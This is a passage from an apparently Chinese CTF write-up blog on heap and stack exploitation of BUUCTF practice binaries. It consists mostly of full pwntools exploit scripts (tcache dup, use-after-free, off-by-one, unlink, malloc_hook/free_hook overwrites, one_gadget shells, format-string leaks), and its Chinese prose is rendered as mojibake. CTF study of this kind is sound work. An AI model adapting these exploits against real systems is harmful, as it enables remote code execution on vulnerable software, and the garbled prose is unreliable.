‡è¯†ä½ï¼Œé»˜è®¤å€¼æ˜¯0ï¼Œè‹¥å°†å…¶æ”¹æˆå…¶ä»–çš„æ–‡ä»¶å·ï¼Œè°ƒç”¨scanfå‡½æ•°åœ¨è·å–æ—¶ï¼Œå°±ä¼šè·å–å¯¹åº”æ–‡ä»¶ã€‚</p><h4 id="éš¾ç‚¹"><a href="#éš¾ç‚¹" class="headerlink" title="éš¾ç‚¹"></a>éš¾ç‚¹</h4><ul><li>ç¨‹åºåªè®©ä½ åˆ†é…0x30æˆ–è€…0x20çš„å †å—ï¼Œå¦‚ä½•ä¼ªé€ å‡ºä¸€ä¸ªè‡³å°‘0x90çš„å †å—ï¼Œå¦‚ä½•é‡Šæ”¾åï¼Œæ¥æ³„æ¼libcã€‚</li><li>æ³„æ¼å‡ºæ¥çš„æ•°æ®ä¸æ˜¯å®Œæ•´çš„ï¼Œå¯å†™æ—¶åªèƒ½å†™ä¸Š2ã€4å­—èŠ‚</li></ul><h3 id="exp-14"><a href="#exp-14" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./ciscn_final_2&#39;local_libc  = &#39;/lib/x86_64-linux-gnu/libc.so.6&#39;remote_libc = local_libc # &#39;./libc.so.6&#39;context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = ELF(local_libc)else:    io = remote(&#39;node3.buuoj.cn&#39;,25252)    libc = ELF(remote_libc)elf = ELF(local_file)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(type,number):    sla(&#39;&gt;&#39;,&#39;1&#39;)    sla(&#39;&gt;&#39;,str(type))    sla(&quot;:&quot;,str(number))def free(type):    sla(&#39;&gt;&#39;,&#39;2&#39;)    sla(&#39;&gt;&#39;,str(type))def show(type):    sla(&#39;&gt;&#39;,&#39;3&#39;)    sla(&#39;&gt;&#39;,str(type))def leave():    sla(&#39;&gt;&#39;,&#39;4&#39;)    # sa(&#39;?&#39;,str(mes))add(1,1)free(1) #leave chunk 0 add(2,2)add(2,2)add(2,2) # 0x90#ready to dupadd(2,2)free(2)add(1,1) # get chunk0free(2)#leak heapshow(2)ru(&#39;number :&#39;)chunk0_addr_word = int(ru(&#39;\n&#39;)) - 0xa0info_addr(&#39;chunk0_addr&#39;,chunk0_addr_word)add(2,chunk0_addr_word)add(2,chunk0_addr_word)add(2,0x91) #fake unsortbin chunk#full tache binsfor i in range(7):    free(1)    add(2,2)#leak libcfree(1)show(1)ru(&#39;number :&#39;)stdin_fillno = int(ru(&#39;\n&#39;)) - 0x2a0 + 0x70info_addr(&#39;stdin_fillno&#39;,stdin_fillno)#ready to attack stdin_fillno ,use taeche dupadd(1,stdin_fillno)add(1,stdin_fillno)free(1)add(2,stdin_fillno)free(1)#leak contains libc&#39;s heapshow(1)ru(&#39;number :&#39;)chunk1_addr_dword = int(ru(&#39;\n&#39;)) - 0x30info_addr(&#39;chunk1_addr_dword&#39;,chunk1_addr_dword)#change the 0x30bins chainsadd(1,chunk1_addr_dword)add(1,chunk1_addr_dword)add(1,stdin_fillno)#attck the filenoadd(1,666)leave()itr()</code></pre><p>æ¸£æ¸£è‹±æ–‡æ³¨é‡Šï¼Œå…ˆä¸æ”¹äº†ã€‚æ„Ÿè§‰è¿˜æ˜¯æŒºä¸å®¹æ˜“åšçš„é¢˜ï¼Œå †å—å¦‚ä½•æ„é€ æƒ³äº†è€ä¹…ã€‚åˆ°åˆ«çš„å¸ˆå‚…é‚£é‡Œï¼Œå½’ç±»ä¸ºç®€å•é¢˜ã€‚å¤ªèœäº†å¤ªèœäº†ï¼ŒåŸºç¡€è¿˜ä¸æ˜¯å¾ˆå¥½ã€‚</p><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a><code>pwnable_hacknote</code></h2><h3 id="åˆ†æ-12"><a href="#åˆ†æ-12" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ç®€å•çš„uaf</p><h4 id="å‘ç‚¹"><a href="#å‘ç‚¹" class="headerlink" title="å‘ç‚¹"></a>å‘ç‚¹</h4><pre><code class="c">(*(void (__cdecl **)(void *))ptr[v1])(ptr[v1]);</code></pre><p>æ­¤å¤„åœ¨æ”¹å®Œ<code>ptr[v1]</code>ä¸ºsystemä»¥åï¼Œå…¶å‚æ•°çš„æŒ‡é’ˆæ˜¯ä»è¿™ä¸ªå †å—å¼€å§‹çš„è¦æå‰è¿›è¡Œæˆªæ–­ã€‚</p><pre><code class="c">system(p32(system) + &#39;||sh&#39;)system(p32(system) + &#39;;sh;&#39;)</code></pre><h3 id="exp-15"><a href="#exp-15" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./hacknote&#39;context.log_level = &#39;debug&#39;debug = 1if debug:    io = process(local_file)else:    io = remote(&#39;node3.buuoj.cn&#39;,27225)elf = ELF(local_file)libc = elf.libccontext.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;size&#39;,str(size))    sa(&#39;Content&#39;,str(data))def free(idx):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))add(0x20,&#39;bbbb&#39;)add(0x20,&#39;bbbb&#39;)free(0)free(1)add(8,p32(0x0804862B) + p32(elf.got[&#39;__libc_start_main&#39;]))show(0)r()libc_base = uu32(r(4)) - 0x18540info_addr(&#39;base&#39;,libc_base)free(2)system = 0x0003ada0 + libc_baseadd(8,p32(system) + &#39;||sh&#39;)show(0)itr()</code></pre><p>Buuè¿œç¨‹æ‰“ä¸é€šã€‚ã€‚</p><h2 id="hitcontraining-heapcreator"><a href="#hitcontraining-heapcreator" class="headerlink" title="hitcontraining_heapcreator"></a><code>hitcontraining_heapcreator</code></h2><h3 id="åˆ†æ-13"><a href="#åˆ†æ-13" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°å¤„ï¼Œæ•…æ„å¯ä»¥å¤šå†™å‡ºä¸€ä¸ªå­—èŠ‚ã€‚</p><ul><li>off by one</li></ul><h3 id="exp-16"><a href="#exp-16" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./heapcreator&#39;context.log_level = &#39;debug&#39;elf = ELF(local_file)debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26646)    libc = elf.libc    # remote_libc = &#39;.&#39; # &#39;./libc.so.6&#39;    # libc = ELF(remote_libc)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;1&#39;)    sla(&#39;Heap&#39;,str(size))    sa(&#39;heap&#39;,str(data))def edit(idx,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sa(&#39;heap&#39;,str(data))def show(idx):    sla(&#39;choice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def free(idx):    sla(&#39;choice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x18,&#39;\x00&#39;)add(0x20,&#39;bbbb&#39;)add(0x20,&#39;cccc&#39;)add(0x10,&#39;dddd&#39;)payload = 0x18 * &#39;a&#39; + &#39;\xa1&#39;edit(0,payload)free(1)add(0x10,&#39;\x78&#39;)show(1)ru(&#39;Content : &#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)free(1)free_hook = 0x3c67a8 + basepaylaod = &#39;\x00&#39; * 2 * 8  + p64(8) + p64(free_hook)add(0x30,paylaod)rce = base + rce16[1]edit(2,p64(rce))free(0)itr()</code></pre><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a><code>0ctf_2017_babyheap</code></h2><h3 id="åˆ†æ-14"><a href="#åˆ†æ-14" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ï¼Œç¨‹åºé€†å‘èµ·æ¥çœ‹èµ·æ¥å¾ˆä¹±ï¼Œå¹¶ä¸”å †å—å®šä½æ˜¯é€šè¿‡æ ˆæ¥ä¼ å‚ï¼Œæ²¡æœ‰å…¨å±€æŒ‡é’ˆã€‚</p><h4 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h4><p>calloc å‡½æ•°åŸºæœ¬è·Ÿmallocä¸€æ ·ï¼Œä½†æ˜¯å†åˆ†é…å¥½å †å—æ—¶ï¼Œä¼šæŠŠåˆ†é…åˆ°çš„å †å—å…¨éƒ¨æ¸…ç†ä¸º0ã€‚</p><h5 id="å½±å“"><a href="#å½±å“" class="headerlink" title="å½±å“"></a>å½±å“</h5><p>æ— æ³•é€šè¿‡ä¼ ç»Ÿçš„unsortbinæ¥leak libcï¼Œç»“åˆfillå‡½æ•°ä¸­çš„å †æº¢å‡ºå³å¯ã€‚</p><h4 id="æ¼æ´ç‚¹-1"><a href="#æ¼æ´ç‚¹-1" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>Fill å‡½æ•°ä¸­ï¼Œæ˜æ˜¾æœ‰å †æº¢å‡ºï¼Œä¸”ååˆ†å¥½ç”¨ï¼Œæ•ˆæœå¾ˆå¤§ã€‚</p><h3 id="exp-17"><a href="#exp-17" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./0ctf_2017_babyheap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26374)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size):    sla(&#39;Command&#39;,&#39;1&#39;)    sla(&#39;Size&#39;,str(size))def fill(idx,size,data):    sla(&#39;mand&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;ize&#39;,str(size))    sa(&#39;tent&#39;,str(data))def free(idx):    sla(&#39;mand&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))def dump(idx):    sla(&#39;mand&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))add(0x30) #0add(0x30) #1add(0x10) #2add(0x10) #3add(0x10) #4add(0x20) #5payload = &#39;a&#39; * 0x30 + p64(0) + p64(0xa1) + p64(0) * 4fill(0,0x60,payload)free(1)add(0x30)dump(2)ru(&#39;Content: \n&#39;)base = uu64(r(6)) - 0x3c4b78info_addr(&#39;libc_base&#39;,base)add(0x50) #6add(0x60) #7add(0x60) #8free(7)free(8)malloc_hook = base + 0x3c4b10payload = p64(0) * 5 + p64(0x71) + p64(0) * 13 + p64(0x71) + p64(malloc_hook-0x23) fill(5,len(payload),payload)add(0x60) #7add(0x60) #8rec = rce16[1] + basepayload = &#39;a&#39; * 0x13 + p64(rec)fill(8,len(payload),payload)add(0x20)itr()</code></pre><h2 id="wustctf2020-closed"><a href="#wustctf2020-closed" class="headerlink" title="wustctf2020_closed"></a><code>wustctf2020_closed</code></h2><pre><code class="c">close(1);close(2);return shell();</code></pre><p>ç›´æ¥å°±ç»™ä½ shelläº†ï¼Œä½†æ˜¯stdoutå·²ç»è¢«å…³é—­äº†ã€‚ä½†æ˜¯å¯¹å…¶æ–‡ä»¶æè¿°ç¬¦<code>1</code>è¿›è¡Œé‡å®šå‘ä¸ºæ²¡æœ‰å…³é—­çš„<code>0</code>å³å¯ã€‚</p><pre><code class="bash">exec 1&gt;&amp;0 &amp;&amp; cat flag</code></pre><h2 id="wustctf2020-getshell-2"><a href="#wustctf2020-getshell-2" class="headerlink" title="wustctf2020_getshell_2"></a><code>wustctf2020_getshell_2</code></h2><h3 id="åˆ†æ-15"><a href="#åˆ†æ-15" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><pre><code class="c">ssize_t vulnerable(){  char buf; // [esp+0h] [ebp-18h]  return read(0, &amp;buf, 0x24u);}</code></pre><p>æ˜æ˜¾å¯ä»¥çœ‹å‡ºåªå¯ä»¥æ§åˆ¶2ä¸ªgadgetã€‚ä¼˜å…ˆæƒ³åˆ°äº†æ ˆè¿ç§»ã€‚å¯æ˜¯ä¹Ÿæ²¡æœ‰åˆé€‚åœ°æ–¹å»è¿ç§»åˆ©ç”¨ã€‚</p><p>å€˜è‹¥å¯ä»¥æ§åˆ¶3ä¸ªgadgetï¼Œç›´æ¥ï¼š</p><pre><code class="c">p32(system.plt) + p32(0xdeadbeef) + p32(sh)</code></pre><p>è¿™æ ·å°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚</p><p>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±<strong>ååˆ†</strong>ç»å¸¸**ç”¨<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code>ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</p><h4 id="çªç ´"><a href="#çªç ´" class="headerlink" title="çªç ´"></a>çªç ´</h4><p>ä½†æ˜¯å°è¯•å»çœ‹ä¸‹åé—¨å‡½æ•°ï¼š</p><pre><code class="c">.text:08048521 ; 2:   return system(&quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;);.text:08048521                 sub     esp, 0Ch.text:08048524                 push    offset command  ; &quot;/bbbbbbbbin_what_the_f?ck__--??/sh&quot;.text:08048529                 call    _system.text:0804852E                 add     esp, 10h.text:08048531                 nop.text:08048532                 leave.text:08048533                 retn</code></pre><p>åœ¨08048524å¤„ï¼Œå¯ä»¥çœ‹åˆ°èµ·å…¶call systemå‰ï¼Œ<code>push    offset command</code>ï¼ŒæŠŠè¿™ä¸ªå­—ç¬¦ä¸²å‹æ ˆï¼Œæ¥ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p><p> é‚£å°±åœ¨æº¢å‡ºæ—¶ï¼Œè¿”å›åœ°å€å¡«ä¸Š<code>08048529</code> ï¼Œåœ¨è‡ªå·±å¡«ä¸Šshçš„åœ°å€å³å¯äº†ã€‚</p><p>è¿™æ ·å°±åœ¨call systemæ—¶ï¼Œå®Œæˆçš„æ˜¯<code>system(sh)</code>ã€‚</p><p>å…¶å®ä¹Ÿæ˜¯å¾ˆç®€å•çš„ï¼š</p><p>ç”±äº<code>å› ä¸ºå¹³æ—¶ropæ—¶ï¼Œ32ä½ä¸‹è‡ªå·±ç»å¸¸ç”¨`å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1`ï¼Œé€ æˆæ€è·¯å¡é¡¿ã€‚</code> ï¼Œå…¶å®è‡ªå·±åˆ†æä»¥åå°±æ˜¯ï¼š<code>å‡½æ•°çš„plt+4å­—èŠ‚+å‚æ•°1</code>ã€‚</p><p>æº¢å‡ºæ—¶ï¼Œå¡«ä¸Š<code>p32(0x8048529) + p32(sh)</code><br>æ ˆä¿¡æ¯ï¼š</p><pre><code>0000| 0xffcca2fc --&gt; 0x8048529 (&lt;shell+14&gt;:     call   0x80483e0 &lt;system@plt&gt;)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>åœ¨æº¢å‡ºè°ƒç”¨æ—¶,retåˆ°ï¼š</p><pre><code>.text:08048529                 call    _system</code></pre><p>å…¶å°±æ˜¯</p><pre><code>push eip+4jmp system.plt</code></pre><p>ç„¶åæ ˆå°±å˜æˆäº†ï¼š</p><pre><code>=&gt; 0x80483e0 &lt;system@plt&gt;:      jmp    DWORD PTR ds:0x804a018 | 0x80483e6 &lt;system@plt+6&gt;:    push   0x18 | 0x80483eb &lt;system@plt+11&gt;:   jmp    0x80483a0 | 0x80483f0 &lt;__libc_start_main@plt&gt;:   jmp    DWORD PTR ds:0x804a01c | 0x80483f6 &lt;__libc_start_main@plt+6&gt;: push   0x20 |-&gt;   0x80483e6 &lt;system@plt+6&gt;:        push   0x18       0x80483eb &lt;system@plt+11&gt;:       jmp    0x80483a0       0x80483f0 &lt;__libc_start_main@plt&gt;:       jmp    DWORD PTR ds:0x804a01c       0x80483f6 &lt;__libc_start_main@plt+6&gt;:     push   0x20                                                                  JUMP is taken[------------------------------------stack-------------------------------------]0000| 0xffcca2fc --&gt; 0x804852e (&lt;shell+19&gt;:     add    esp,0x10)0004| 0xffcca300 --&gt; 0x8048670 --&gt; 0x6873 (&#39;sh&#39;)</code></pre><p>è¿™å°±å˜æˆäº†ï¼Œè‡ªå·±ç†Ÿæ‚‰çš„<code>å‡½æ•°çš„plt+è¿”å›åœ°å€+å‚æ•°1</code></p><h3 id="exp-18"><a href="#exp-18" class="headerlink" title="exp"></a>exp</h3><pre><code>from pwn import *import timelocal_file  = &#39;./wustctf2020_getshell_2&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,25032)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]offset = 28sh = elf.search(&#39;sh\x00&#39;).next()system = 0x8048529payload = &#39;a&#39; * offset + p32(system) + p32(sh)s(payload)itr()</code></pre><h2 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a><code>axb_2019_heap</code></h2><h3 id="åˆ†æ-16"><a href="#åˆ†æ-16" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä¿æŠ¤å…¨å¼€ã€‚</p><h4 id="æ¼æ´ç‚¹-2"><a href="#æ¼æ´ç‚¹-2" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><ul><li>æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œå¯ä»¥æ³„æ¼å‡ºç¨‹åºå’Œlibcçš„åŸºå€</li><li>editå‡½æ•°ä¸­ï¼Œé”™è¯¯çš„sizeé€‰å–ï¼Œå¯¼è‡´æ¯æ¬¡å¯ä»¥å¤šæº¢å‡º0x10çš„å­—èŠ‚ï¼Œå¨åŠ›å°±å¾ˆå¤§äº†ï¼Œprev sizeä¸ sizeéƒ½å¯ä»¥æ”¹åˆ°ã€‚</li></ul><p>ç›´æ¥è¿›è¡Œunlinkæ”»å‡»å³å¯ã€‚ä¼°è®¡å°±æ˜¯è€ƒè¿™ä¸ªçš„ï¼Œç¨‹åºé™åˆ¶äº†ä¸èƒ½ç”³è¯·0x80ä»¥ä¸‹çš„å †å—ï¼Œä¸”keyå€¼åŸºæœ¬æ²¡åŠæ³•æ”¹åˆ°ã€‚</p><h3 id="exp-19"><a href="#exp-19" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./axb_2019_heap&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26837)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(idx,size,data):    sla(&#39;&gt;&gt;&#39;,&#39;1&#39;)    sla(&#39;(0-10)&#39;,str(idx))    sla(&#39;size&#39;,str(size))    sla(&#39;content&#39;,str(data))def free(idx):    sla(&#39;&gt;&gt;&#39;,&#39;2&#39;)    sla(&#39;dex&#39;,str(idx))def edit(idx,data):    sla(&#39;&gt;&gt;&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;content&#39;,str(data))payload = &#39;%15$p&#39; + &#39;%11$p&#39;sla(&#39;name&#39;,payload)ru(&#39;Hello, 0x&#39;)libc_base = int(r(12),16) - 0x20830info_addr(&#39;libc_base&#39;,libc_base)ru(&#39;0x&#39;)bin_base = int(r(12),16) - 0x1186info_addr(&#39;bin_base&#39;,bin_base)note = bin_base + 0x202060key = bin_base + 0x202040add(0,0x88,&#39;aaaaaaaa&#39;)add(1,0x100,&#39;bbbbbbbb&#39;)add(2,0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,payload)free(1)free_hook = 0x3c67a8 + libc_basepayload = p64(0) * 3 + p64(free_hook) + p64(0x88)edit(0,payload)rec = rce16[1] + libc_baseedit(0,p64(rec))free(2)itr()</code></pre><h2 id="hitcontraining-unlink"><a href="#hitcontraining-unlink" class="headerlink" title="hitcontraining_unlink"></a><code>hitcontraining_unlink</code></h2><h3 id="åˆ†æ-17"><a href="#åˆ†æ-17" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>Editå‡½æ•°ä¸­ï¼Œæœ‰ä¸ªå¤§å¨åŠ›çš„å †æº¢å‡ºã€‚<br>ç”¨unlinkæ”»å‡»ã€‚</p><h3 id="exp-20"><a href="#exp-20" class="headerlink" title="exp"></a>exp</h3><pre><code class="python">from pwn import *import timelocal_file  = &#39;./bamboobox&#39;elf = ELF(local_file)context.log_level = &#39;debug&#39;debug = 0if debug:    io = process(local_file)    libc = elf.libcelse:    io = remote(&#39;node3.buuoj.cn&#39;,26818)    libc = elf.libc    #libc = ELF(&#39;.&#39;)context.arch = elf.archcontext.terminal = [&#39;tmux&#39;,&#39;neww&#39;]#,&#39;&#39;splitw&#39;,&#39;-h&#39;rce16 = [0x45216,0x4526a,0xf02a4,0xf1147]s      = lambda data               :io.send(data) sa      = lambda delim,data         :io.sendafter(delim, data)sl      = lambda data               :io.sendline(data)sla     = lambda delim,data         :io.sendlineafter(delim, data)r      = lambda numb=4096          :io.recv(numb)ru      = lambda delims, drop=True  :io.recvuntil(delims, drop)uu32    = lambda data               :u32(data.ljust(4, &#39;\0&#39;))uu64    = lambda data               :u64(data.ljust(8, &#39;\0&#39;))info_addr = lambda tag, addr        :io.info(tag + &#39;==&gt;&#39; +&#39;: {:#x}&#39;.format(addr))itr     = lambda                    :io.interactive()def debug():    # gdb.attach(proc.pidof(io)[0],gdbscript=&#39;b main&#39;)    gdb.attach(io)    pause()def add(size,data):    sla(&#39;choice&#39;,&#39;2&#39;)    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def edit(idx,size,data):    sla(&#39;ice&#39;,&#39;3&#39;)    sla(&#39;dex&#39;,str(idx))    sla(&#39;len&#39;,str(size))    sa(&#39;name&#39;,str(data))def show():    sla(&#39;choice&#39;,&#39;1&#39;)def free(idx):    sla(&#39;ice&#39;,&#39;4&#39;)    sla(&#39;dex&#39;,str(idx))note = 0x006020C0 + 8add(0x88,&#39;aaaaaaaa&#39;)add(0x100,&#39;bbbbbbbb&#39;)add(0x88,&#39;cccccccc&#39;)payload = p64(0) + p64(0x31) + p64(note-0x18) + p64(note - 0x10) + p64(0) * 2 + p64(0x30)payload += p64(0) * 9 + p64(0x80) + p64(0x110)edit(0,len(payload),payload)free(1)show()ru(&#39;0 : &#39;)libc_base = uu64(r(6)) - 0x3c48e0info_addr(&#39;libc_base&#39;,libc_base)free_hook = 0x3c67a8 + libc_basepayload = p64(libc_base + 0x3c48e0) + p64(0)  + p64(0x88) + p64(free_hook)edit(0,len(payload),payload)rec = rce16[1] + libc_baseedit(0,8,p64(rec))free(2)itr()</code></pre><h2 id="ciscn-2019-s-9"><a href="#ciscn-2019-s-9" class="headerlink" title="ciscn_2019_s_9"></a><code>ciscn_2019_s_9</code></h2><h3 id="åˆ†æ-18"><a href="#åˆ†æ-18" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>32ä½ç¨‹åºï¼Œä¿æŠ¤å…¨å…³ï¼Œç›®æ ‡å®šä½ç€shellcodeå»ã€‚</p><h4 id="æ¼æ´ç‚¹-3"><a href="#æ¼æ´ç‚¹-3" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h4><p>æ ˆæº¢å‡ºï¼Œå¯ä»¥æº¢å‡º14ä¸ªå­—èŠ‚ï¼Œè¿™æ˜¯32ä½ç¨‹åºç”¨ropå°±å¯ä»¥æ‰“äº†ã€‚ä½†æ˜¯ä¸ºç›¸å¯¹éº»çƒ¦ä¸€ç‚¹ã€‚</p><pre><code class="python">.text:08048551             hint            proc near.text:08048551             ; __unwind {.text:08048551 55                          push    ebp.text:08048552 89 E5                       mov     ebp, esp.text:08048554 FF E4                       jmp     esp.text:08048554             hint            endp</code></pre><p>åœ¨é¢˜ç›®å½“ä¸­ï¼Œæœ‰ä¸ªhintå‡½æ•°ï¼Œå°±æ˜¯ç»™æç¤ºçš„ï¼Œæç¤ºåˆ°<code>jmp esp</code> è¿™ä¸ªgadgetã€‚</p><p>å…¶ä¸­ï¼Œå¯ä»¥æƒ³åˆ°åœ¨æ ˆæº¢å‡ºä¸­ï¼Œæœ‰ç»™<code>ret addr</code>å¡«ä¸Š<code>jmp esp</code> ï¼Œåœ¨æ¥ä¸Šshellcodeã€‚è¿™åº”è¯¥æ˜¯å¾ˆç»å…¸çš„ç”¨æ³•ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š<a href="http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/" target="_blank" rel="noopener">http://www.atomsec.org/%E5%AE%89%E5%85%A8/%E6%A0%88%E6%BA%A2%E5%87%BAjmp-esp%E5%8E%9F%E7%90%86/</a></p><p>æ„é€ æ€è·¯ï¼š</p><pre><code>Payload = overflow + jmp esp address + shellcode</code></pre><p>ä½†æ˜¯è¿™ä¸ªé¢˜å°±æ˜¯åªèƒ½æº¢å‡º14å­—èŠ‚ï¼Œè¿”å›åœ°å€å†å 